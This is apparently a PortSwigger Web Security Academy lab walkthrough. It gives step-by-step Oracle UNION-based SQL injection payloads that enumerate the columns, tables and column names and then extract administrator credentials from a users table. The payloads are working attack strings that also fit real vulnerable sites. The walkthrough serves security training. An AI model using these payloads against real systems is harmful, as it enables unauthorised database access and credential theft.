# SQL Injection Part 3: Portswigger Labs
### [Lab10: SQL injection attack, listing the database contents on Oracle](https://0a4000fb036fe53ec00903d500a80086.web-security-academy.net/filter?category=Lifestyle)
**To solve: Login as the administrator**

**STEP 1:**
Find number of columns 
```html
' UNION SELECT null,null FROM DUAL--
```

**STEP 2:**
Find columns that contains text
```html
' UNION SELECT 'a', 'a' from DUAL--
```

**STEP 3:**
Output the list of tables in the database 
```html
' UNION SELECT table_name,null FROM all_tables--
```

**STEP 4:**
Output the column names of the users table
```html
' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name = 'USERS_RANDOM'--
```

**STEP 5:**
Use the USERNAME_RANDOM and PASSWORD_RANDOM column and USERS_RANDOM table to get credentials
```html
' UNION SELECT USERNAME_RANDOM,PASSWORD_RANDOM FROM USERS_RANDOM--
```

**STEP 6:**
Login


